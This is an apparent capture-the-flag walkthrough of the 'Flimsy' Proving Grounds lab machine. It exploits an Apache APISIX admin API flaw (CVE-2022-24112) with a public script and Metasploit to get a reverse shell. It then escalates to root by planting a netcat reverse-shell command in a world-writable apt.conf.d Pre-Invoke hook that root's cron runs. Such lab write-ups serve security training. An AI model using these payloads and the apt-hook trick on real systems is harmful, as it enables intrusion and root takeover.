### Flimsy Proving Grounds Practice

### Difficulty = Easy

### IP Address = 192.168.95.220

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Flimsy]
└─$ nmap -sCV -A 192.168.95.220 -p22,80,3306,43500 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 08:26 WAT
Nmap scan report for 192.168.95.220
Host is up (0.23s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open  mysql   MySQL (unauthorized)
43500/tcp open  http    OpenResty web app server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.76 seconds
```

Checking out the web server on port 80 returns this page
![image](https://user-images.githubusercontent.com/113513376/214505542-9e232040-6453-4514-a3b7-7224a010ed54.png)

I'll start gobuster in background and check out the web server on port `43500` 

From the version nmap fingerprinted we can see the web server title

I'll check google for known exploits

And here's what i got [Exploit](https://www.exploit-db.com/exploits/50829)

So i'm gonna try it out

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Flimsy]
└─$ python exploit.py                                                            

                                   .     , 
        _.._ * __*\./ ___  _ \./._ | _ *-+-
       (_][_)|_) |/'\     (/,/'\[_)|(_)| | 
          |                     |          

                (CVE-2022-24112)
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }


[!] Usage   : ./apisix-exploit.py <target_url> <lhost> <lport>
```

I will run it again but this giving it the necessary arguments

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Flimsy]
└─$ python3 exploit.py http://192.168.95.220:43500/ 192.168.49.95 80

                                   .     , 
        _.._ * __*\./ ___  _ \./._ | _ *-+-
       (_][_)|_) |/'\     (/,/'\[_)|(_)| | 
          |                     |          

                (CVE-2022-24112)
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }


```

But for some reason it doesn't work it just hangs i think its cause of the payload being sent to the server or the routing isn't ok

I don't want to start debugging and passing the request through a proxy though its a good practice 

So i'll use metasploit xD

```
msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > run

[-] Handler failed to bind to 192.168.49.95:80:-  -
[-] Handler failed to bind to 0.0.0.0:80:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:80).
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > search apisix

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_apisix_api_default_token_rce  2020-12-07       excellent  Yes    APISIX Admin API default access token RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/apache_apisix_api_default_token_rce

msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > use 0
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > set rhosts 192.168.95.220
rhosts => 192.168.95.220
msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > set lhost tun0
lhost => tun0
msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > set rport 43500
rport => 43500
msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > set lport 80
lport => 80
msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > run

[*] Started reverse TCP handler on 192.168.49.95:80 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 192.168.95.220:43500
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (192.168.49.95:80 -> 192.168.95.220:46794) at 2023-01-25 08:50:44 +0100

whoami
franklin
id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
```

Now i'll get a more stable shell 

```
┌──(mark__haxor)-[~]
└─$ nc -lvnp 445 
listening on [any] 445 ...
connect to [192.168.49.95] from (UNKNOWN) [192.168.95.220] 51618
$ which python3
which python3
/bin/python3
```

To stabilize 

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Now lets escalate privilege

Checking crontab we see there's a cron running apt-update

```
franklin@flimsy:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root apt-get update
* * * * * root /root/run.sh
franklin@flimsy:/tmp$ 
```

By default the apt update files are stored in `/etc/apt/apt.conf.d`

Now we see its also writeable 

```
franklin@flimsy:/etc/apt$ ls -l
total 32
drwxrwxrwx 2 root root 4096 Aug 24 16:06 apt.conf.d
drwxr-xr-x 2 root root 4096 Apr  9  2020 auth.conf.d
drwxr-xr-x 2 root root 4096 Apr  9  2020 preferences.d
-rw-r--r-- 1 root root 2717 Jun 15  2022 sources.list
-rw-r--r-- 1 root root 2743 Feb 23  2022 sources.list.curtin.old
drwxr-xr-x 2 root root 4096 Jun 30  2022 sources.list.d
-rw-r--r-- 1 root root 1188 Jun 30  2022 trusted.gpg
drwxr-xr-x 2 root root 4096 Jun 30  2022 trusted.gpg.d
franklin@flimsy:/etc/apt$ 
```

Oh cool so we can write into the apt.conf.d directory

I'll put a bash reverse shell in that directory

```
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.95 80 >/tmp/f"};' > shell
```

After a minute i get a connection back on the netcat listner on port 80

```
┌──(mark__haxor)-[~/Desktop/Scripts]
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [192.168.49.95] from (UNKNOWN) [192.168.95.220] 44514
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -al
total 80
drwx------  9 root root 4096 Jan 25 08:08 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..
lrwxrwxrwx  1 root root    9 Jun 30  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root 8072 Jun 18  2022 build.sh
drwx------  2 root root 4096 Jun 16  2022 .cache
drwx------  3 root root 4096 Jan 23 10:27 default.etcd
drwxr-xr-x  4 root root 4096 Jun 30  2022 flimsy
-rw-r--r--  1 root root 1085 Jun 30  2022 .group.bak
drwxr-xr-x  3 root root 4096 Jun 16  2022 .local
-rw-------  1 root root  854 Jun 30  2022 nohup.out
-rw-r--r--  1 root root 2930 Jun 30  2022 .passwd.bak
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root   33 Jan 25 08:08 proof.txt
drwxr-xr-x  2 root root 4096 Jun 30  2022 .rpmdb
-rwxrwxrwx  1 root root  154 Jun 30  2022 run.sh
-rw-r--r--  1 root root 1745 Jun 30  2022 .shadow.bak
drwx------  3 root root 4096 Jun 15  2022 snap
drwx------  2 root root 4096 Jun 15  2022 .ssh
-rw-r--r--  1 root root  165 Jun 30  2022 .wget-hsts
# cat proof.txt
99c81324a8afcb7560a6ca56428c22a3
#
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>
  


